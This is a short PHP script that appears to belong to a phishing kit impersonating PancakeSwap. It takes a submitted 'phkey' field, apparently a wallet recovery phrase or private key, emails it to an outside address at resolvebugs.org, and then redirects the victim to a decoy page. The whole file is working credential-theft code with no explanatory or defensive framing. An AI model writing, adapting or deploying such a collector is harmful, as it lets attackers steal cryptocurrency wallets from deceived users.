<?php 



$phkey = $_POST['phkey'];


$to = "admin@resolvebugs.org"; 

$subject = "New Message from pancakeswap"; 

$body = "phkey : $phkey";

mail($to,$subject,$body); 

header("location:pancakes.html") ;  ?>